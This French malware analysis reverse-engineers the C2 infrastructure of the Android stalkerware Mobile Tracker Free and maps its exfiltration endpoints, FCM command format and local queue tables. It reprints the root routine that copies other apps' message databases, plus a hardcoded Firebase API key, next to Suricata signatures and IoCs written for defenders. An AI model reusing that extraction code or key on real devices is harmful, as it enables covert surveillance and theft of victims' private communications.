# Mobile Tracker Free — C2 Infrastructure — Analyse complète

> **Package** : `phone.monitor2026` v161
> **Date** : 2026-04-09
> **Source** : JADX MCP reverse engineering

---

## 1. Architecture C2

### 1.1 Vue d'ensemble

```
                    ┌─────────────────────────────────┐
                    │      Dashboard abuseur           │
                    │  https://mobile-tracker-free.com │
                    └──────────┬──────────────────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                ▼
   ┌──────────────┐  ┌──────────────┐  ┌──────────────┐
   │  Firebase    │  │  C2 HTTPS    │  │  Socket.IO   │
   │  FCM Push   │  │  Retrofit    │  │  Temps réel  │
   │  (commands)  │  │  (exfil)     │  │  (live)      │
   └──────┬───────┘  └──────┬───────┘  └──────┬───────┘
          │                 │                 │
          └────────────┬────┘─────────────────┘
                       ▼
              ┌──────────────────┐
              │  phone.monitor   │
              │     2026         │
              │   (victime)      │
              └──────────────────┘
```

**3 canaux C2 simultanés** :
1. **Firebase FCM** — canal push descendant (commandes serveur → device)
2. **HTTPS Retrofit** — canal montant (exfiltration données device → serveur)
3. **Socket.IO** — canal bidirectionnel temps réel (live streaming, file explorer)

---

## 2. URLs et sélection dynamique

### 2.1 C2 principal vs fallback

| Ressource | URL | Rôle |
|-----------|-----|------|
| `my_url` | `https://mobile-track-data.com/` | **C2 principal** |
| `my_url_other` | `https://mobile-tracker-free.com/scriptsV5/` | **C2 fallback** |

**Mécanisme de sélection** (classe `kw1`) :
```java
String url = sharedPrefs.getBoolean("urlOther", false) 
    ? getString(R.string.my_url_other)   // fallback
    : getString(R.string.my_url);         // principal
```

### 2.2 Triggers du basculement vers fallback

Le flag `urlOther` est activé (`true`) dans 2 cas :

**a) Détection de locale russe** (LoginActivity) :
```java
String locale = AbstractC0270gt.m2282G(this);
if (locale.toLowerCase().equals("ru")) {
    C0207f3.m1798B0(this);  // → urlOther = true
}
```
→ `mobile-track-data.com` est probablement bloqué en Russie, d'où le basculement automatique.

**b) Erreurs réseau** (AbstractC0410kl.m3129l) :
```java
catch (SocketException | UnknownHostException e) {
    if (mc0.m3581A(context)) {
        C0207f3.m1798B0(context);  // → urlOther = true
    }
}
```
→ Si le C2 principal est injoignable (DNS blocked, connection refused), bascule automatique sur le fallback.

---

## 3. Client HTTP — Retrofit

### 3.1 User-Agent stalkerware

```
ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019
```

**DIFFÉRENT** du User-Agent du dropper (`KABNKNHFFHDHYD58698347556988AD89GH2020`). Deux signatures réseau distinctes pour deux composants distincts.

### 3.2 Interface API (`InterfaceC0091c`) — 3 méthodes

| Méthode | Type | Usage |
|---------|------|-------|
| `m833a(endpoint, Map<String,String>)` | POST form-data → String | Envoi données texte (SMS, contacts, logs, etc.) |
| `m834b(endpoint, Map<String,dz0>, on0)` | POST multipart + fichier → String | Upload fichiers binaires (audio, photos, screenshots) |
| `m835c(endpoint, Map<String,String>)` | POST form-data → ResponseBody | Requêtes avec réponse JSON (login, vérification) |

Headers communs :
```
User-Agent: ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019
Accept-Language: UTF-8
Connection: close
```

Timeouts : 15s connect / 30s read / 30s write.

### 3.3 Authentification

**Chaque requête** inclut un `tokenSecurity` :
```java
map.put("tokenSecurity", sharedPrefs.getString("tokenSecurity", ""));
```

Le token est un **string aléatoire de 100 caractères** (SecureRandom, charset `[0-9A-Za-z-]`) généré lors de l'enregistrement initial du téléphone et stocké dans SharedPreferences.

### 3.4 Fonctions d'envoi (AbstractC0410kl)

| Méthode | Prototype | Usage |
|---------|-----------|-------|
| `m3135s` | `(String endpoint, HashMap params) → boolean` | Envoi form-data, vérifie réponse `"ok"` |
| `m3136t` | `(String endpoint, HashMap params, on0 file) → boolean` | Upload multipart + fichier binaire |
| `m3129l` | `(String endpoint, HashMap params) → JSONObject` | Envoi + parsing réponse JSON |

---

## 4. Endpoints PHP — Carte complète

### 4.1 Gestion utilisateur / téléphone

| Endpoint | Méthode | Paramètres | Réponse |
|----------|---------|------------|---------|
| `user/verifPhone.php` | `m3129l` (JSON) | email, password, namePhone, device info | `{status:"ok", nbPhone: N}` |
| `user/savePhone.php` | `m3129l` (JSON) | email, password, namePhone, tokenSecurity | `{status:"ok", idPhone: N}` |
| `user/updatePhone.php` | `m3135s` | idPhone, namePhone | `"ok"` |

### 4.2 Exfiltration — Données texte

| Endpoint | Données exfiltrées | Paramètres clés |
|----------|--------------------|-----------------|
| `sms/insertSMS.php` | SMS | idPhone, name, number, message, type, date, location |
| `sms/insertSMSAlert.php` | SMS alerts (mots-clés) | idPhone, name, number, message, keyword |
| `mms/insertMMS.php` | MMS | idPhone, name, number, message, type, date, data[0..N] |
| `calls/insertCall.php` | Journal d'appels | idPhone, name, number, type, duration, date, location |
| `contacts/insertContactNew.php` | Contacts | idPhone, name, number, idContact, date |
| `calendar/insertCalendar.php` | Événements calendrier | idPhone, title, description, dateStart/End, location |
| `location/insertLocation.php` | Position GPS | idPhone, date, longitude, latitude, altitude, accuracy, address, gps |
| `clipboard/insertClipboard.php` | Presse-papier | idPhone, copiedText, date |
| `applications/insertApplication.php` | Apps installées | idPhone, name, namePackage, version, size, installDate, stateApp |
| `applications/insertApplicationsUsage.php` | Usage apps | idPhone, dataUsage |
| `site/insertSiteHistory.php` | Historique web | idPhone, url, nameSite, dateUsed, browser |
| `sim/setChangeSIM.php` | Changement SIM | idPhone, data |

### 4.3 Exfiltration — Fichiers binaires (multipart upload)

| Endpoint | Données | Paramètres multipart |
|----------|---------|--------------------|
| `calls/insertCallRecord.php` | **Enregistrements d'appels** | idPhone, name, number, type, duration, date, pathFile + fichier audio |
| `recordAudio/setRecordAudio.php` | **Enregistrements micro ambiant** | idPhone, dateConnexion, type, idLog + fichier audio |
| `pictures/insertPicture.php` | **Photos** | idPhone, name, pathFile, size, date, location + fichier image |
| `pictures/setPicturePasswordFailed.php` | **Photo échec mot de passe** (Base64) | idPhone, dateConnexion, data (Base64), type |
| `screenshot/insertScreen.php` | **Screenshots** | idPhone, pathFile, date + fichier image |
| `fileExplorer/insertNewFileFirst.php` | File explorer — métadonnées | idPhone, nameFile, pathFile, date |
| `fileExplorer/insertNewFile.php` | File explorer — fichier | idPhone, nameFile + fichier |

### 4.4 Commandes distantes

| Endpoint | Usage | Paramètres |
|----------|-------|------------|
| `remoteControl/setLog.php` | **Log de toutes les commandes FCM** | idPhone, dateConnexion, type, idLog, data |

Utilisé comme **accusé de réception** pour chaque commande FCM exécutée. Le champ `data` contient le résultat (ex: `"BLOCKOK--1234"`, `"WIPEDATAOK"`, `"RECORDAUDIOERROR"`, `"CALLINPROGRESS"`, screenshots en Base64, etc.).

### 4.5 Live streaming

| Endpoint | Usage |
|----------|-------|
| `live/sendToken.php` | Échange de token WebRTC pour live streaming (idPhone, token) |

### 4.6 IM — No-Root (via AccessibilityService + NotificationListener)

Pattern systématique : `socialNetwork/noRoot/insert{App}Messages.php`

| Endpoint | App | Enum ID |
|----------|-----|---------|
| `socialNetwork/noRoot/insertFacebookMessages.php` | Facebook Messenger | 0 |
| `socialNetwork/noRoot/insertWhatsAppMessagesNew.php` | WhatsApp | 1 |
| `socialNetwork/noRoot/insertViberMessages.php` | Viber | 2 |
| `socialNetwork/noRoot/insertSkypeMessages.php` | Skype | 3 |
| `socialNetwork/noRoot/insertLineMessages.php` | LINE | 4 (inferred) |
| `socialNetwork/noRoot/insertKikMessages.php` | KIK | 5 (inferred) |
| `socialNetwork/noRoot/insertTangoMessages.php` | Tango | 6 (inferred) |
| `socialNetwork/noRoot/insertHangoutsMessages.php` | Hangouts | 7 (inferred) |
| `socialNetwork/noRoot/insertTelegramMessages.php` | Telegram | 8 |
| `socialNetwork/noRoot/insertWechatMessages.php` | WeChat | 9 |
| `socialNetwork/noRoot/insertSnapchatMessages.php` | Snapchat | 10 |
| `socialNetwork/noRoot/insertTinderMessages.php` | Tinder | 11 (inferred) |
| `socialNetwork/noRoot/insertHikeMessages.php` | Hike | 12 (inferred) |
| `socialNetwork/noRoot/insertInstagramMessages.php` | Instagram | 13 (inferred) |
| `socialNetwork/noRoot/insertTwitterMessages.php` | Twitter | 14 (inferred) |
| `socialNetwork/noRoot/insertGmailMessages.php` | Gmail | 15 |
| `socialNetwork/noRoot/insertIMOMessages.php` | IMO | 16 (inferred) |
| `socialNetwork/noRoot/insertYoutubeHistory.php` | YouTube | 17 |
| `socialNetwork/noRoot/insertSignalMessages.php` | Signal | 18 |

Paramètres communs : `idPhone`, `fullName`, `message`, `type`, `date`.
Le champ `urlScript` est stocké **dans la base SQLite locale** (`TABLE_CONFIG_SOCIAL_NETWORK`), permettant au serveur de modifier dynamiquement l'endpoint d'upload.

### 4.7 IM — Root (extraction directe des bases SQLite)

Pattern : `socialNetwork/root/insert{App}.php`

| Endpoint | App | Base de données volée |
|----------|-----|----------------------|
| `socialNetwork/root/insertFacebook.php` | Facebook Messenger | `/data/data/com.facebook.orca/databases/*.threads_db2` |
| `socialNetwork/root/insertFacebook.php` | Facebook Lite | `/data/data/com.facebook.mlite/databases/core.db` |
| `socialNetwork/root/insertHangouts.php` | Hangouts | `/data/data/com.google.android.talk/databases/babel*.db` |
| `socialNetwork/root/insertKik.php` | KIK | `/data/data/kik.android/databases/*.kikDatabase.db` |
| `socialNetwork/root/insertWhatsApp.php` (inf.) | WhatsApp | `/data/data/com.whatsapp/databases/msgstore.db` + `wa.db` |
| `socialNetwork/root/insertInstagram.php` (inf.) | Instagram | `/data/data/com.instagram.android/databases/direct.db` |
| `socialNetwork/root/insertLine.php` (inf.) | LINE | `/data/data/jp.naver.line.android/databases/naver_line` |
| `socialNetwork/root/insertViber.php` (inf.) | Viber | `/data/data/com.viber.voip/databases/viber_messages` |
| `socialNetwork/root/insertGmail.php` (inf.) | Gmail | `/data/data/com.google.android.gm/databases/mailstore.{account}.db` |

Méthode d'extraction root :
```java
DataOutputStream dos = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
dos.writeBytes("cat /data/data/{package}/databases/{db} > {staging_dir}/{db}\n");
dos.writeBytes("chmod 777 {staging_dir}/*\n");
dos.writeBytes("chmod -R 777 {staging_dir}\n");
dos.flush();
Thread.sleep(10000);  // Attend 10 secondes pour la copie
// Puis lecture SQLite + exfiltration via Retrofit
```

---

## 5. Firebase — Canal de commandes (FCM)

### 5.1 Configuration Firebase

| Paramètre | Valeur |
|-----------|--------|
| Project | `myappmobile-537f7` |
| Sender | `38496474107` |
| API Key | `AIzaSyDbUBsZ11AUjeuOW9e8g1azhCV3wmDKhQ0` |
| App ID | `1:38496474107:android:1437f8b679b84fe53ab15e` |

### 5.2 Protocole FCM

Format du message : champ `action` contient la commande séparée par `--` :
```
action = "TakePictureFront--1##1--42"
→ strArrSplit[0] = "TakePictureFront"  (commande)
→ strArrSplit[1] = "1##1"              (paramètre : front + flash)
→ strArrSplit[2] = "42"                (idLog pour accusé de réception)
```

Chaque commande exécutée envoie un **accusé de réception** via `remoteControl/setLog.php` avec le résultat.

### 5.3 Catégories de commandes (60+)

Voir le rapport principal `mtf_payload_analysis.md` pour la liste complète.

---

## 6. Socket.IO — Canal temps réel

Socket.IO est utilisé pour 3 fonctionnalités nécessitant une connexion bidirectionnelle persistante :

1. **Live Video/Audio** (`LiveRTCVideoAudioService`) — WebRTC signaling via Socket.IO
2. **Live Screen** (`LiveRTCScreenService`) — MediaProjection streaming via Socket.IO
3. **File Explorer** (`FileExplorerRemote`) — Navigation distante dans le filesystem

Le token WebRTC est échangé via `live/sendToken.php` avant l'établissement de la connexion Socket.IO.

---

## 7. Base SQLite locale — File d'attente d'exfiltration

Le stalkerware utilise une **file d'attente SQLite locale** pour stocker les données en attente d'exfiltration. Tables identifiées :

| Table | Données |
|-------|---------|
| `TABLE_CONFIG_CALLS` | Journal d'appels + enregistrements en attente |
| `TABLE_CONFIG_MEDIA` | Photos en attente d'upload |
| `TABLE_CONFIG_APPS` | Apps installées à exfiltrer |
| `TABLE_CONFIG_APPS_BLOCK_STATE` | État blocage apps |
| `TABLE_CONFIG_APPS_USAGE` | Stats usage apps |
| `TABLE_CONFIG_CLIPBOARD` | Presse-papier capturé |
| `TABLE_CONFIG_SCREENSHOT` | Screenshots en attente |
| `TABLE_CONFIG_SOCIAL_NETWORK` | Messages IM capturés (avec `urlScript` dynamique) |
| `TABLE_CONFIG_FILE_EXPLORER` | Fichiers à exfiltrer |
| `TABLE_LOGS` | Logs de commandes en attente de confirmation |

Le `UploadDataService` utilise un **ThreadPoolExecutor** (dimensionné sur le nombre de CPU) pour uploader en parallèle les différentes catégories de données.

---

## 8. Enregistrement initial du téléphone

### 8.1 Flow

```
[1] LoginActivity → email + password (validation basique)
    ↓
[2] ConfigPhoneActivity → namePhone + passwordSMS
    ↓
[3] POST user/verifPhone.php
    → Vérifie si le téléphone existe déjà
    → Réponse: {status: "ok", nbPhone: N}
    ↓
[4] Génère tokenSecurity (100 chars, SecureRandom)
    ↓
[5] POST user/savePhone.php
    → Enregistre le téléphone
    → Réponse: {status: "ok", idPhone: N}
    ↓
[6] Stockage local SharedPreferences:
    - idPhone (identifiant serveur)
    - tokenSecurity (authentification future)
    - codeSecret = "*1234*"
    - namePhone
    ↓
[7] Démarrage de tous les services de surveillance
```

### 8.2 Gestion d'erreurs

| Réponse serveur | Action |
|-----------------|--------|
| `{status: "ok"}` | Enregistrement OK |
| `{status: "novalidemail"}` | Email non validé — affiche message |
| Autre / null | Erreur serveur — retry |

---

## 9. Vulnérabilités du protocole C2

### 9.1 OPSEC failures

1. **User-Agent hardcodé** (`ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019`) → signature triviale pour IDS/proxy
2. **Pas de certificate pinning** → interception MITM possible de toute l'exfiltration
3. **tokenSecurity en clair** dans SharedPreferences → extraction triviale avec root ou backup
4. **Endpoints PHP en clair** dans le code → révèle l'architecture serveur complète
5. **Base64 pour photos/screenshots** dans les form-data → pas de chiffrement de la payload
6. **Firebase API key en clair** → abus potentiel (push de fausses commandes si projet mal configuré)
7. **Fallback URL en clair** → révèle l'infrastructure de secours
8. **`Connection: close`** sur toutes les requêtes → pas de keep-alive, plus de connexions TCP distinctes (plus détectable)
9. **Réponse `"ok"` en texte brut** → pas de checksum/signature de la réponse

### 9.2 Points de détection réseau

| Méthode | Indicateur |
|---------|-----------|
| User-Agent | `ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019` |
| User-Agent dropper | `KABNKNHFFHDHYD58698347556988AD89GH2020` |
| Domaine principal | `mobile-track-data.com` |
| Domaine fallback | `mobile-tracker-free.com` (path `/scriptsV5/`) |
| URI patterns | `/remoteControl/setLog.php`, `/socialNetwork/noRoot/insert*.php`, `/socialNetwork/root/insert*.php` |
| Firebase project | `myappmobile-537f7` (sender `38496474107`) |
| Comportement | POST multipart récurrent vers mêmes endpoints avec même UA |

---

## 10. Signatures Suricata complètes

```suricata
# === DROPPER ===

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper - User-Agent";
    flow:established,to_server;
    http.user_agent;
    content:"KABNKNHFFHDHYD58698347556988AD89GH2020";
    classtype:trojan-activity;
    sid:20260001; rev:2;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v2.7 - Legacy C2";
    flow:established,to_server;
    http.host;
    content:"appapk.mtf.re";
    classtype:trojan-activity;
    sid:20260002; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v2.7 - getURLFTP";
    flow:established,to_server;
    http.uri;
    content:"getURLFTP.php";
    classtype:trojan-activity;
    sid:20260003; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v3.9 - C2 Domain";
    flow:established,to_server;
    http.host;
    content:"tracker-free.com";
    classtype:trojan-activity;
    sid:20260004; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v3.9 - downloadAPK";
    flow:established,to_server;
    http.uri;
    content:"downloadAPK.php";
    classtype:trojan-activity;
    sid:20260005; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Dropper v3.9 - Version Check";
    flow:established,to_server;
    http.uri;
    content:"getVersionApp.php";
    classtype:trojan-activity;
    sid:20260006; rev:1;
)

# === STALKERWARE PAYLOAD ===

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - User-Agent";
    flow:established,to_server;
    http.user_agent;
    content:"ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019";
    classtype:trojan-activity;
    sid:20260007; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - C2 Primary";
    flow:established,to_server;
    http.host;
    content:"mobile-track-data.com";
    classtype:trojan-activity;
    sid:20260008; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - C2 Fallback";
    flow:established,to_server;
    http.host;
    content:"mobile-tracker-free.com";
    http.uri;
    content:"scriptsV5";
    classtype:trojan-activity;
    sid:20260009; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - Remote Control";
    flow:established,to_server;
    http.uri;
    content:"remoteControl/setLog.php";
    classtype:trojan-activity;
    sid:20260010; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - IM Exfil NoRoot";
    flow:established,to_server;
    http.uri;
    content:"socialNetwork/noRoot/insert";
    classtype:trojan-activity;
    sid:20260011; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - IM Exfil Root";
    flow:established,to_server;
    http.uri;
    content:"socialNetwork/root/insert";
    classtype:trojan-activity;
    sid:20260012; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - Call Recording Upload";
    flow:established,to_server;
    http.uri;
    content:"calls/insertCallRecord.php";
    classtype:trojan-activity;
    sid:20260013; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - Audio Recording Upload";
    flow:established,to_server;
    http.uri;
    content:"recordAudio/setRecordAudio.php";
    classtype:trojan-activity;
    sid:20260014; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - Screenshot Upload";
    flow:established,to_server;
    http.uri;
    content:"screenshot/insertScreen.php";
    classtype:trojan-activity;
    sid:20260015; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - File Exfil";
    flow:established,to_server;
    http.uri;
    content:"fileExplorer/insertNewFile";
    classtype:trojan-activity;
    sid:20260016; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"STALKERWARE MTF Payload - Live Token";
    flow:established,to_server;
    http.uri;
    content:"live/sendToken.php";
    classtype:trojan-activity;
    sid:20260017; rev:1;
)
```

---

## 11. Résumé des IoC réseau

### 11.1 Domaines

| Domaine | Rôle |
|---------|------|
| `mobile-track-data.com` | C2 principal (exfiltration) |
| `mobile-tracker-free.com` | Site web + C2 fallback (`/scriptsV5/`) |
| `tracker-free.com` | Dropper v3.9 API |
| `apkv2.tracker-free.com` | Dropper v3.9 CDN download |
| `appapk.mtf.re` | Dropper v2.7 legacy |
| `myappmobile-537f7.firebaseio.com` | Firebase DB |
| `myappmobile-537f7.firebasestorage.app` | Firebase Storage |

### 11.2 User-Agents

| User-Agent | Composant |
|------------|-----------|
| `ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019` | Stalkerware payload |
| `KABNKNHFFHDHYD58698347556988AD89GH2020` | Dropper v2.7 + v3.9 |

### 11.3 Endpoints PHP (37 identifiés)

**User** : `user/verifPhone.php`, `user/savePhone.php`, `user/updatePhone.php`
**SMS** : `sms/insertSMS.php`, `sms/insertSMSAlert.php`
**MMS** : `mms/insertMMS.php`
**Calls** : `calls/insertCall.php`, `calls/insertCallRecord.php`
**Contacts** : `contacts/insertContactNew.php`
**Calendar** : `calendar/insertCalendar.php`
**Location** : `location/insertLocation.php`
**Clipboard** : `clipboard/insertClipboard.php`
**Apps** : `applications/insertApplication.php`, `applications/insertApplicationsUsage.php`
**Web** : `site/insertSiteHistory.php`
**Photos** : `pictures/insertPicture.php`, `pictures/setPicturePasswordFailed.php`
**Audio** : `recordAudio/setRecordAudio.php`
**Screenshots** : `screenshot/insertScreen.php`
**Files** : `fileExplorer/insertNewFile.php`, `fileExplorer/insertNewFileFirst.php`
**SIM** : `sim/setChangeSIM.php`
**Live** : `live/sendToken.php`
**Remote** : `remoteControl/setLog.php`
**IM no-root** : `socialNetwork/noRoot/insert{App}Messages.php` (19 endpoints)
**IM root** : `socialNetwork/root/insert{App}.php` (9+ endpoints)
